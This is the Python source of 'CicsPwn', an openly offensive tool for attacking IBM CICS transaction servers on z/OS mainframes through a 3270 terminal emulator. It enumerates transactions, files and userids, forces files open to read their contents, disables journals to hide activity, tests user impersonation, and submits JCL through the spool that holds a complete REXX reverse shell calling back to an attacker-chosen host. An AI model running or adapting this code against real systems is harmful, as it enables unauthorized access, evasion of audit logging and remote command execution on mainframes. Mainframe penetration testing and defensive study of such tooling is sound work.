import py3270
import os
import re
import sys
import socket
import time
import datetime
import string
import random
from random import randrange
from py3270wrapper import WrappedEmulator
import signal
import argparse 

TRAN_NUMBER = 500
SLEEP = 0.5
AUTHENTICATED = False
DO_AUTHENT = False

# handle TDQueue

class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    CYAN="\033[36m"
    PURPLE="\033[35m"
    WHITE="";

    def disable(self):
        self.HEADER = ''
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
        self.RED = ''
        self.ENDC = ''

def sleep():
  time.sleep(SLEEP)
  
def signal_handler(signal, frame):
        print 'Done !'
        sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

parser = argparse.ArgumentParser(description='CicsPwn: a tool to pentest CICS transaction servers on z/OS')
parser.add_argument('IP',help='The z/OS Mainframe IP or Hostname')
parser.add_argument('PORT',help='CICS/VTAM server Port')
parser.add_argument('-a','--applid',help='CICS ApplID on VTAM, default is CICS',default="CICS",dest='applid')

parser.add_argument('-i','--info',help='Gather information about a CICS region',action='store_true',default=False,dest='info')
parser.add_argument('-t','--trans',help='Get all installed transactions on a CICS TS server',action='store_true', default=False, dest='trans')
parser.add_argument('-f','--files',help='List all installed files a on TS CICS',action='store_true',default=False,dest='files')
parser.add_argument('-p','--pattern',help='Specify a pattern of a files/transaction to get (default is "*")',default="*",dest='pattern')
parser.add_argument('-U','--userid',help='Specify a userid to use on CICS',dest='userid')
parser.add_argument('-P','--password',help='Specify a password for the userid',dest='password')
parser.add_argument('--get-file',help='Get the content of a file. It attempts to change the status of the file if it\'s not enabled, opened or readable',dest='filename')
parser.add_argument('--enable-trans',help='Enable a single transaction ',dest='ena_trans')
parser.add_argument('-q','--quiet',help='Remove Trailing and journal before performing any action',action='store_true',default=False,dest='journal')
parser.add_argument('-u','--userids',help='Scrape userids found in different menus',action='store_true',default=False,dest='userids')
parser.add_argument('-g','--surrogat',help='Checks wether you can impersonate another user when submitting a job', default=False,dest='surrogat_user')
parser.add_argument('-s','--submit',help='Submit JCL to CICS server, default is a reverse shell in REXX',action='store_true',default=False,dest='submit')

parser.add_argument('-l','--lhost',help='Remote server to call back to for reverse shell (host:port)',dest='lhost')
parser.add_argument('-j','--jcl',help='Custom JCL file to provide',dest='jcl')

results = parser.parse_args() 

def show_screen():
    data = em.screen_get();
    for d in data:
        print d
        
def whine(text, kind='clear', level=0):
	typdisp = ''
	lvldisp = ''
	color =''
	if kind == 'warn': typdisp = '[!] ';color=bcolors.YELLOW
	elif kind == 'info': typdisp = '[+] ';color=bcolors.WHITE
	elif kind == 'err': typdisp = '[#] ';color=bcolors.RED
	elif kind == 'good': typdisp = '[*] ';color=bcolors.GREEN
	if level == 1: lvldisp = "\t"
	elif level == 2: lvldisp = "\t\t"
	elif level == 3: lvldisp = "\t\t\t"
	print color+lvldisp+typdisp+text+ (bcolors.ENDC if color!="" else "");

def connect_zOS(em, target):
    whine('Connecting to target '+target,kind='info')
    if "992" in target or "10024" in target:
        em.connect('L:'+target)
    else:
        em.connect(target)
    em.send_enter()
    if not em.is_connected():
        whine('Could not connect to ' + target + '. Aborting.',kind='err')
        sys.exit(1)

def do_authenticate(userid, password, pos_pass):
   #~ if cesn:
       #~ em.move_to(1,2)
       #~ em.safe_send("CESN                                           ");
       #~ em.send_enter();
       #~ sleep()   
   posx, posy = em.get_pos()
      
   em.safe_send(results.userid)   
         
   em.move_to(pos_pass,posy+1)
   em.safe_send(results.password)
   em.send_enter();
   
   data = em.screen_get();
   if any("Your userid is invalid" in s for s in data):
      whine('Incorrect userid information','err')
      sys.exit();
   elif any("Your password is invalid" in s for s in data):
      whine('Incorrect password information','err')
      sys.exit();
      
              
def check_valid_applid(applid, do_authent, method = 1):
    em.send_string(applid) #CICS APPLID in VTAM
    em.send_enter()   
    sleep()
    
    if do_authent:
        pos_pass=1;
        data = em.screen_get()   
        for d in data:
            print "eeed"
            if "Password" in d or "Code" in d:
                break;
            else:
               pos_pass +=1
        do_authenticate(results.userid, results.password, pos_pass)
    
    if method ==1:
      em.send_clear()
      
    if method ==3:
      em.send_pf3()
      sleep()
      em.send_clear()
            
    if method ==2:
      em.send_clear()
      sleep()
      em.send_clear()    
      
    em.move_to(1,1)  
    #em.send_string('CESF') #CICS CESF is the Signoff command
    em.send_pf3()
    em.send_enter()
    sleep();
    
    if em.find_response( 'DFHAC2001'):
        whine('APPLID '+applid+' is valid',kind='good')
        em.send_clear();
        return True
    elif method > 2:
        return False
    else:
        method += 1
        whine('Returning to CICS terminal via method '+str(method),kind='info')
        return check_valid_applid(applid, do_authent, method)

def query_cics(request, verify, line):
    em.move_to(1,2);
    em.safe_send(request+'                                              ');
    em.send_enter();
    
    data = em.screen_get()
    if verify in data[line-1].strip():
        return True
    else:
        return False

def get_cics_value(request, identifier, double_enter=False):
    em.move_to(1,2);
    for i in identifier:
        request += " "+i+"(&"+i[:3]+")"
    if len(request) > 79:
        whine("Request longer than terminal screen",'err')
        sys.exit();
    
    em.safe_send(request+'                                              ');
    em.send_enter();
    
    if double_enter:
        em.send_enter();
    
    sleep()
    em.send_pf5();
    data = em.screen_get()
    j=5; out = []
    for i in identifier :
       out.append(data[j][23:].strip())
       j+=1
    
    em.send_pf3();
    return out;
    

def send_cics(request, double=False):
    em.send_clear();
    em.move_to(1,2);
    em.safe_send(request+'                                              ');
    em.send_enter();
    if double:
       em.send_enter();
    data = em.screen_get()
    if "RESPONSE: NORMAL" in data[22]:
        return True
    else:
        return False

def get_hql():
    em.move_to(1,2);
    request = "CEMT I DSNAME"
    em.safe_send(request+'                                              ');
    em.send_enter();
    
    data = em.screen_get()
    for d in data:
       if "Dsn" in d and "(DFH" not in d:
           pos= d.find("Dsn(") + len("Dsn(")
           dataset =  d[pos:pos+44].strip()
           em.send_pf3()
           return dataset[:dataset.rfind(".")]+".**"
    
    em.send_pf3()
    return None
def get_users():
    out = []
    em.move_to(1,2);
    request = "CEMT I TASK"
    em.safe_send(request+'                                              ');
    em.send_enter();
    
    data = em.screen_get()
    for d in data:
       if "Use" in d:
           pos= d.find("Use(") + len("Use(")
           out.append(d[pos:pos+8].strip())
    
    em.send_pf3()
    return out
    
def get_infos():
    cemt = True
    ceci = True
    cecs = False
    ceda = True
    cedf = True
    cebr = False
    userid = ''
    hlq = None
        
    #~ if query_cics('CEMT','Inquire',5):
      #~ cemt = True
      #~ em.send_pf3();
    #~ if query_cics('CEDA','ALter',5):
      #~ ceda = True
      #~ em.send_pf3();        
    #~ if query_cics('CECI','ACquire',5):
        #~ ceci = True
        #~ em.send_pf3();
    #~ if query_cics('CECS','ACquire',5):
        #~ ceci = True
        #~ em.send_pf3();
    #~ if query_cics('CEDF ,OFF','EDF MODE OFF',1):
        #~ cedf = True
        #~ em.send_pf3();
    if query_cics('CEBR','ENTER COMMAND',2):
        cebr = True
        em.send_pf3();
        
    em.send_clear()
    whine("Available IBM supplied transactions: ", 'info');
    if cemt: whine("CEMT", 'good',1);
    if ceci: whine("CECI", 'good',1);
    if ceda: whine("CEDA", 'good',1);
    if cedf: whine("CEDF", 'good',1);
    if cebr: whine("CEBR", 'good',1);
    if not ceci:
        whine("Little information will be available on the system", 'err');
        
    
    whine("General system information: ", 'info');
    variables = ["USERID", "SYSID","NET","NATl"]
    values = get_cics_value('CECI ASSIGN', variables, True)        
    userid = values[0]; sysid = values[1]; netname = values[2]; language = values[3]
    
    hlq = get_hql();
    
    whine("Userid: "+userid,'good',1);
    whine("Sysid: "+sysid,'good',1);
    whine("LU session name: "+netname,'good',1);
    whine("language: "+language,'good',1);
    if hlq:
       whine("HLQ:"+hlq,'good',1)
    whine("Active users", 'info');
    users = get_users();
    if users:
       for u in users:
           whine(u, 'good', 1)
    else:
        whine('No active user', 'info',1)
        
    whine("JCL Submission", 'info');
    spool = send_cics('CECI SpoolOpen OUTPUT USERID(INTRDR  ) NODE(LOCAL   )',True)
    em.send_pf3();
    if cemt:
        tdqueue = send_cics('CEMT INQUIRE TDQueue (IRDR)',True)
        em.send_pf3();    
    
    if spool and ceci:
        whine('Access to internal spool is apparently available','good',1);
                
    if tdqueue and ceci:
        whine('Transiant queue to access spool is apparently available','good',1);
            
    if spool == False and tdqueue ==False:
        whine('No way to submit JCL through this CICS region','err',1);
    
    whine("Access control", 'info');
    
    
    variables = ["READ"]
    read = get_cics_value('CECI QUERY SECURITY RESC(FACILITY) RESID(XXX) RESIDL(3) ', variables, True)
    read = ''.join(read)
    if read == "+0000000035":
        whine('CICS does not use RACF/ACF2/TopSecret. Every user has as much access as the CICS region ID','good',1);
        sys.exit();
        
    variables = ["READ"]
    read = get_cics_value('CECI QUERY SECURITY RESC(TSOAUTH) RESID(JCL) RESIDL(3) ', variables, True)
    read = ''.join(read)
    if read == "+0000000035":
        whine('User '+userid+' authorized to submit JOBS','good',1);
    else:
        whine('User '+userid+' not authorized to submit JOBS','err',1);
    
    # add check for OMVS, SUPERUSER, SERVER, DAMON, etc.
    
    #whine("Connection information", 'info');       
    
    #DB2: authtype, connectst, db2release, db2id
    #MQ: ???
        
   
def get_transactions(transid):
    
     em.send_clear()
     em.move_to(1,2);
     
     print "ID\tPROGRAM"
     em.safe_send('CEMT Inquire Trans('+transid+') en                                           ');
     em.send_enter()
     
     #sleep()
     number_tran = 0;
     more = True
     out = []
     while (more==True and number_tran < TRAN_NUMBER):
        more = False;
        data = em.screen_get()
        for d in data:
            if "Tra(" in d and "NOT FOUND" not in d:
                number_tran +=1;
                if (number_tran % 9) ==0 and d[1]=="+":
                    more = True
                    continue
                print d[7:11].strip() + "\t"+d[28:36].strip()
        
        if more:
            em.send_pf11();
      
     if number_tran == 0:
       whine('No transaction matched the pattern, start again or make sure you have access to the CEMT utility (-i option)','err')


def get_files(filename):
    
     em.send_clear()
     em.move_to(1,2);
          
     print "FILE\tTYPE\tSTATUS\tREAD\tUPDATE\tDISP\tLOCATION"
     
     em.safe_send('CEMT Inquire File('+filename+')                                            ');
     em.send_enter()
     
     #sleep()
     number_files = 0;
     more = True
     
     while (more==True and number_files < TRAN_NUMBER):
        more = False;
        data = em.screen_get()
        for d in data:
            if "Fil(" in d and "NOT FOUND" not in d:
                number_files +=1;
                if (number_files % 9) ==0 and d[1]=="+":
                    more = True
                    continue
                    
                file_name = d[7:15].strip()
                file_type = d[17:20].strip()
                file_status = d[21:24].strip()
                file_access_read = d[29:32].strip()
                file_access_update = d[33:36].strip()
                file_dsp = d[53:56].strip()
                out = file_name + "\t" + file_type +"\t" + file_status +"\t"+ file_access_read +"\t"+ file_access_update +"\t"+ file_dsp
            elif "Dsn(" in d:
                file_dsn = d[15:60]
                out += "\t"+ file_dsn
                print out
                
        if more:
            em.send_pf11();
      
     if number_files == 0:
       whine('No files matched the pattern, start again or make sure you have access to the CEMT utility (-i option)','err')

def fetch_content(filename, ridfld, keylength):
    em.move_to(1,2);
    request = 'CECI READ FI('+filename.upper()+') RI('+str(ridfld)+') GTE INTO(&FI)'
    em.safe_send(request)
    em.send_enter()
    em.send_enter() # Send twice Enter to confirm transaction
    
    data = em.screen_get();
    if "NORMAL" not in data[22]:
        return -1    
    
    em.send_pf5()   # Access Variable definition
    
    data = em.screen_get()
    posx = 0     # localize the variable &FI
    i =0;
    for d in data:
        if "&FI" in d :
            posx = i
        i +=1    
        
    em.move_to(posx+1,2)
    
    em.send_enter()
    
    data = em.screen_get()
    out = ""
    for d in data:        
      if d.find("+00") < 5 and d.find("+00") > -1:
         out += d[11:]
    print out
    
    return out[0:keylength]
    
def get_file_content():
    file_enabled, file_readable, file_opened = False, False, False;
    keylength, recordsize = 0, 0
    em.send_clear()
    em.move_to(1,2);
    
    if len(results.filename) > 8:
       whine('Filename cannot be over 8 characters, Name will be truncated','err')
    
    filename = results.filename[:8]
    ridfld = "000000";
    
    ## get file properties ##
    request = 'CEMT I READ FI('+filename.upper()+')                                  '
    em.safe_send(request)
    em.send_enter()
    data = em.screen_get()
    if "Ope " in data[2]:
        file_opened = True
    if "Ena " in data[2]:
        file_enabled = True
    if "Rea " in data[2]:
        file_readable = True
    if file_readable and file_enabled and file_opened:
        whine("File "+results.filename+" is enabled, open, and readable", 'good')
    else:
        whine("File "+results.filename+" is lacking attributes to be readable. Changing that via CEMT", 'info')
        em.move_to(1,2);
        request = 'CEMT Set READ FI('+filename.upper()+') OPE ENA                           '
        em.safe_send(request)
        em.send_enter()
        data = em.screen_get();
        if "NORMAL" in data[2]:
            whine("File "+results.filename+" is enabled, open, and readable", 'good')
    
    # getting key length and record size. Can only do when then the file is enabled and opened
    em.move_to(1,2);
    request = 'CEMT I READ FI('+filename.upper()+')                                  '
    em.safe_send(request)
    em.send_enter()
    
    # Display more info about the file
    em.move_to(3,5);
    em.send_enter()
    
    em.send_pf11();
    
    data = em.screen_get();
    for d in data:
        pos1 = d.find("Keylength( ")
        pos2 = d.find("Recordsize( ")
        if pos1 > -1:
            pos1 = pos1 + len("Keylength( ")
            keylength = int(d[pos1:pos1+3])
        if pos2 > -1:
            pos2 = pos2 + len("Recordsize( ")
            recordsize = int(d[pos2:pos2+5])
        
    if keylength != 0 and recordsize !=0:
        whine("Record size: "+str(recordsize)+"\tkeylength:"+str(keylength), 'good')
    else:
        whine("Could not get record size and keylength size, default values will be used (rsize = 80, klen=6)", 'err')
        keylength = 6
        recordsize = 80
    
    # Exit CEMT utility
    em.send_pf3()
    
    next_ridfld = 0;
    
    while int(next_ridfld) != -1:
       ridfld = next_ridfld
       next_ridfld = fetch_content(filename, ridfld, keylength)
       next_ridfld = format(int(next_ridfld)+1, "0"+str(keylength))
         

def rand_name(size=8, chars=string.ascii_letters):
	return ''.join(random.choice(chars) for x in range( 1, size ))

def dummy_jcl(lhost):
    dummy_jcl = '''//CICSUSER JOB (INTRDR),USER=SVTSCU,CLASS=A
//*
//STEP01 EXEC  PGM=IKJEFT01
//SYSTSPRT DD  SYSOUT=*
//SYSTSIN  DD *
 FTP '''+lhost.split(":")[0]+''' '''+lhost.split(":")[1]+'''
/*
//SYSIN    DD  DUMMY
/*EOF'''
    return dummy_jcl    
    
def jcl_creator(lhost, username="CICSUSER"):
	
	job_name = username
	rexx_file = rand_name(randrange(3,6))
	source_file = rand_name(randrange(3,6))
	exec_file = rand_name(randrange(3,6))

	jcl_code = "//"+job_name.upper()+" JOB ("+"123456768"+"""),CLASS=A
//*
//EXIST2  EXEC PGM=IDCAMS
//SYSPRINT DD  SYSOUT=*
//SYSIN    DD  *
 LISTC ENT('CICSUSER.REV5')
 IF LASTCC = 0 THEN DELETE 'CICSUSER.REV5'
/*
//CREATERX  EXEC PGM=IEBGENER
//SYSPRINT   DD SYSOUT=*
//SYSIN      DD DUMMY
//SYSUT2     DD DSN=CICSUSER.REV5,
//           DISP=(NEW,CATLG,DELETE),SPACE=(TRK,5),
//           DCB=(RECFM=FB,LRECL=80,BLKSIZE=27920)
//SYSUT1     DD *
  /* REXX */ 
 /* nl ='25'x;reverse('213.152.162.84','60738');exit */
   nl ='25'x;reverse('"""+lhost.split(":")[0]+"""','"""+lhost.split(":")[1]+"""');exit
 reverse:
 PARSE ARG rhost,  rport
    t=SOCKET('INITIALIZE','CLIENT',2);
    t=SOCKET('SOCKET',2,'STREAM','TCP');
    parse var t socket_rc s . ;
    if socket_rc <> 0 then do
       t= SOCKET('TERMINATE');exit 1;end
    t=Socket('SETSOCKOPT',s,'SOL_SOCKET','SO_KEEPALIVE','ON')
    t=SOCKET('SETSOCKOPT',s,'SOL_SOCKET','SO_ASCII','On')
    t=SOCKET('SOCKETSETSTATUS','CLIENT')
    t=SOCKET('CONNECT',s,'AF_INET' rport rhost)
    t= SOCKET('SEND',s, 'Shell> ')
  DO FOREVER
  g_cmd = get_cmd(s);parse = exec_cmd(s,g_cmd);end;return 0
 close_socket:
    parse arg exito .
    te = SOCKET('CLOSE',s); exit;return 0
 get_cmd:
 parse arg socket_to_use
    sox = SOCKET('RECV',socket_to_use,10000);
    parse var sox s_rc s_type s_port s_ip s_results;
    parse var sox s_rc s_data_len s_data_text;
    if s_rc <> 0 then do CALL close_socket(1);end
    c = DELSTR(s_data_text, LENGTH(s_data_text)); return c;
  INLIST: procedure
     arg sock, socklist; do i=1 to words(socklist)
       if words(socklist) = 0 then return 0
       if sock = word(socklist,i) then return 1;end;return 0
 current_user:
   text = nl||'userID: '||userid()||nl; return text
 exec_tso:
   parse arg tso_do
   text = nl||'Issuing TSO Command: '||tso_do||nl
   u = OUTTRAP('tso_out.'); ADDRESS TSO tso_do;
   u = OUTTRAP(OFF);DO i = 1 to tso_out.0
      text = text||tso_out.i||nl;end;return text
 exec_cmd:
 parse arg sockID, do_it; parse var do_it do_it do_commands
 SELECT
  WHEN do_it = 'getuid' THEN DO
    te=SOCKET('SEND',sockID, current_user()||nl); end
  WHEN do_it = 'tso' | do_it = 'execute' THEN do
   t=SOCKET('SEND',sockID, exec_tso(do_commands)||nl);end
  WHEN do_it = 'exit' THEN DO
    call close_socket '1';exit;end;end
 te = SOCKET('SEND',sockID, 'Shell> ');return 1;
/*
//SYSOUT     DD SYSOUT=*
//STEP01 EXEC  PGM=IKJEFT01
//SYSTSPRT DD  SYSOUT=*
//SYSTSIN  DD *
 EX 'CICSUSER.REV5'
/*
//SYSIN    DD  DUMMY
//"""
	return jcl_code

def set_mixedCase(em):
    whine('Setting the current terminal to mixed case',kind='info')
    em.safe_send('CEMT') #CICS APPLID in VTAM
    em.send_enter()
    sleep()
    if em.find_response( 'Inquire'):
       pass
    else:
        whine('CEMT Inquire is not available',kind='err')
        return -1
    request = 'CEMT I TASK'
    em.safe_send(request)
    em.send_enter()
    data = em.screen_get()
    for d in data:
        termID = None
        if "Fac(" in d and "CEMT" in d:
            pos = d.find("Fac(")+len("Fac(")
            termID = d[pos:pos+4]
            whine('Got TerminalID '+termID,kind='good')
            break;
    
    em.send_pf3();
    em.move_to(1,2);
    sleep()
    
    request = 'CECI SET TERM('+termID+') NOUCTRAN'
    em.safe_send(request)
    em.send_enter()
    em.send_enter()
    whine('Current terminal is NOW mixed case',kind='good')
    em.send_pf3();
    return 1
    

def open_spool():
    #em.send_pf3();
    #em.send_clear();
    
    #sleep()
    em.move_to(1,2);
    request = "CECI SPOOLOPEN OUTPUT USERID('INTRDR  ') NODE('LOCAL   ') TOKEN(&TOKTEST)       "
    em.safe_send(request)
    em.send_enter()
    em.send_enter()
        
    data = em.screen_get()
    for d in data:
        print d
        token = None
        if "Token( '" in d:
            pos = d.find("Token( '")+len("Token( '")
            token = d[pos:pos+8]
            if token.strip() != "" :
                whine('Got token '+token,'good',1)
            break
    if "RESPONSE: NORMAL" not in data[22]:
        whine('Could not grab a valid token...a good chance the spool disabled, use -i to verify','err')
        sys.exit();
    return token

def spool_write(token, jcl):
    whine('Preparing JCL to submit','info')      
    
    # write each line in a variable
    i = 0;
    for j in jcl.split("\n"):        
        # Go the variable screen
        em.send_pf5()
                
        em.move_to(7,2)
        em.send_eraseEOF()
        em.send_enter();
        
        request = "&SQLKHDS  +00080"
        em.safe_send(request);
        em.send_enter();
        sleep()
        
        em.move_to(7,24)
        em.safe_send(j);        
        em.send_enter();
        sleep()
        #show_screen();
        
        # back to the normal screen
        em.send_enter();
        em.move_to(1,2)
        request = 'SPOOLWRITE TOKEN(&TOKTEST) FROM(&SQLKHDS) FLENGTH(80)                                '
        em.safe_send(request);
        em.send_enter();  
        em.send_enter();
        
        show_screen();  
        
        i += 1
        data = em.screen_get();
        if "RESPONSE: NORMAL" not in data[22]:
            whine('Problem writting to the spool (line '+i+' of JCL)','err')
            sys.exit();
       
    whine('JCL Written successfully to the spool','good',1)   
    return 0

def close_spool():
    
    em.move_to(1,2)
    request = 'SPOOLCLOSE TOKEN(&TOKTEST)                                                         '
    em.safe_send(request);
    em.send_enter();  
    em.send_enter();
    
    data = em.screen_get()  
    if "RESPONSE: NORMAL" not in data[22]:
            whine('Problem submitting the spool','err')
            sys.exit();
    whine('JOB submitted successfully to JES','good',1)
    
def submit_job(lhost, dummy = True):
    #if (set_mixedCase(em)==-1):
    #    sys.exit();
    if results.jcl:
       f = open(results.jcl,"r")
       lines = f.readlines()
       jcl = ''.join(lines);
    elif dummy:
        whine('Dummy JCL used for this attempt','info')
        jcl = dummy_jcl(lhost);
    else:
        jcl = jcl_creator(lhost)
        
    token = open_spool();
    if token:
        spool_write(token, jcl)
    close_spool()


def activate_transaction(ena_trans):
    em.move_to(1,2);
    trans_ena  = False
    ## get transaction properties ##
    request = 'CEMT I TRANS('+ena_trans.upper()+')                                  '
    em.safe_send(request)
    em.send_enter()
   
    data = em.screen_get()
    
    if "Ena " in data[2]:
        whine("Transaction "+ena_trans+" is already enabled", 'good')
        
    else:
        em.move_to(1,2);
        request = 'CEMT Set TRANSACTION('+ena_trans.upper()+') ENA                           '
        em.safe_send(request)
        em.send_enter()
        data = em.screen_get();
        if "NORMAL" in data[2]:
            whine("Transaction "+ena_trans+" is enabled and open", 'good')

def disable_journal():
    number_journals = 0;
    all_journals = 0;
    em.move_to(1,2);
    request = "CEMT S JOURNAL ALL DIS"
    em.safe_send(request+'                                              ');
    em.send_enter();
    
    data = em.screen_get()
    for d in data:
       if "Jou(" in d and "NORMAL" in d and "Dis" in d and "DFHLOG" not in d:
           number_journals +=1;
           all_journals += 1;
       elif "Jou(" in d and "NORMAL" not in d and "Ena" in d and "DFHLOG" not in d:
           pos= d.find("Jou(") + len("Jou(")
           whine("Journal "+d[pos:pos+8]+" could not be disabled",'err');
           all_journals += 1;
          
    if number_journals > 0:
       whine(str(number_journals)+" of "+str(all_journals) +" journals were disabled",'good')
    else:
       whine("Only DFHLOG is defined, cannot disable this system log",'err');

def query_cics_scrap(request, pattern, length, depth, scrolls):
    em.move_to(1,2);
    em.safe_send(request+'                                              ');
    em.send_enter();
    out = []
    i =0;
    
    if depth == 1:
       em.move_to(3,7)
       em.send_enter();
        
    while i < scrolls:
        em.send_pf11();
        i +=1;
    data = em.screen_get()
         
    for d in data:
       if pattern in d:
           pos= d.find(pattern) + len(pattern)
           if d[pos:pos+length].strip() in out:
              continue;
           out.append(d[pos:pos+length].strip().replace(")",""))
    
    em.send_pf3();
    if len(out) > 0:
      return '\n'.join(out)
    else:
      return None;

        
def fetch_userids():
    tcl_u = query_cics_scrap("CEMT I TCL", "Installu(", 8, 0, 0)
    if not tcl_u:
      tcp_u = query_cics_scrap("CEMT I TCPIPSERV", "Installusrid(", 8, 1, 1)
      print tcp_u if tcp_u else '';
    else:
      print tcl_u
      
    con_u = query_cics_scrap("CEMT I CONN", "Changeusrid(", 8, 1, 1)
    print con_u if con_u else '';
    uri_u = query_cics_scrap("CEMT I URIMAP", "Userid(", 8, 1, 1)
    print uri_u  if uri_u else '';
    
    db2_u = query_cics_scrap("CEMT I DB2C", "Signid(", 8, 1, 1)
    print db2_u if db2_u else '';
    
def check_surrogat(surrogat_user):
    
    variables = ["READ"]
    read = get_cics_value('CECI QUERY SECURITY RESC(FACILITY) RESID(XXX) RESIDL(3) ', variables, True)
    read = ''.join(read)
    if read == "+0000000035":
        whine('CICS does not use RACF/ACF2/TopSecret. It is impossible to query the SURROGAT class','err',0);
        sys.exit();    
    
    variables = ["READ"]
    length = str(len(surrogat_user)+ 6)
    
    read = get_cics_value('CECI QUERY SECURI RESC(SURROGAT) RESID('+surrogat_user.upper()+'.SUBMIT) RESIDL('+length+') ', variables, True)
    read = ''.join(read)
    if read == "+0000000035":
        whine('You can impersonate '+surrogat_user,'good',0);
    else:
        whine('You cannot impersonate '+surrogat_user,'err',0);

# Some basic checks
if (results.submit and (results.lhost == None or len(results.lhost.split(":")) < 2) and not results.jcl):
    whine('You must specify a connect back address with the option --lhost <LHOST:PORT> ','err')
    sys.exit();
  
             
em = WrappedEmulator(False)
connect_zOS(em, results.IP+":"+results.PORT)

if (results.userid != None and results.password !=None):
   #if (len(results.userid) > 7 or len(results.password > 7)):
   #    whine('Userid and Passwords cannot be longer than 8 characters','err')
    #   sys.exit();
   DO_AUTHENT = True
   data = em.screen_get()   
   pos_pass=1;
   logon_screen=False
   
   for d in data:
     if "Password" in d or "Code" in d:
       logon_screen=True
       break
     else:
       pos_pass +=1
   if logon_screen:
       do_authenticate(results.userid, results.password, pos_pass)
       whine("Successful authentication", 'info')
       AUTHENTICATED = True;

# Checking if APPLID provided is valid
if not check_valid_applid(results.applid, DO_AUTHENT):
    whine("Applid "+results.applid+" not valid, try again maybe it's a network lag", "err")
    sys.exit();

# Sometimes CICS is accessed without going through VTAM
#if (results.userid != None and results.password !=None and not AUTHENTICATED ):
#   cesn = True
   
      
#if results.info == False and results.trans == False and results.files == False and results.submit == False and results.filename == None:
#    results.info = True

if results.info:
    whine("Getting information about CICS server (APPLID: "+results.applid+")", 'info')
    get_infos();

elif results.trans:
    if len(results.pattern) > 4:
       whine('Transaction ID cannot be over 4 characters, ID will be truncated','err')
    if len(results.pattern) < 4 and "*" not in results.pattern:
       results.pattern +="****"
     
    transid = results.pattern[:4]
    whine("Getting all transactions that match "+transid, 'info')
    get_transactions(transid);
    
elif results.files:
    if len(results.pattern) > 8:
        whine('Filename cannot be over 8 characters, Name will be truncated','err')
    if len(results.pattern) < 8 and "*" not in results.pattern:
       results.pattern +="********"
     
    filename = results.pattern[:8]    
    
    whine("Getting all files that match "+filename, 'info')
    get_files(filename);
    
elif results.filename:
    whine("Getting Attributes of file "+results.filename, 'info')
    get_file_content();

elif results.ena_trans:
    whine("Activating the transaction "+results.ena_trans, 'info')
    if len(results.ena_trans) != 4:
        whine("Transaction ID has to be 4 characters long "+results.ena_trans, 'err')
        sys.exit();
        
    activate_transaction(results.ena_trans);
    
elif results.submit:
    submit_job(results.lhost);

elif results.journal:
    whine("Disabling journal before moving on", 'info')
    disable_journal();

elif results.userids:
    whine("Scraping userids from different menus", 'info')
    fetch_userids();
    
elif results.surrogat_user:
    whine("Checking whether you can impersonate Userid "+results.surrogat_user, 'info')
    check_surrogat(results.surrogat_user)
    
def check_VTAM(em):
	whine('Checking ifactivate in VTAM',kind='info')
	#Test command enabled in the session-level USS table ISTINCDT, should always work
	em.send_string('IBMTEST')
	em.send_enter()
	#sleep()
	if not em.find_response( 'IBMECHO ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'):
		for i in xrange(1,5):
			time.sleep(0.3+(i/10))
			if em.find_response( 'IBMECHO ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'):
				whine('The host is slow, increasing delay by 0.1s to: 0.3s',kind='warn')
			else:
				em.send_string('IBMTEST')
				em.send_enter()
		whine('Mainframe not in VTAM, aborting',kind='err')
		#check_CICS(em) #All may not be lost
		return False
	elif em.find_response( 'REQSESS error'):
		whine('Mainframe may be in a weird VTAM, continuing reluctantly',kind='warn')
	else:
		whine('VTAM interface detected',kind='info')
        return True

em.terminate()
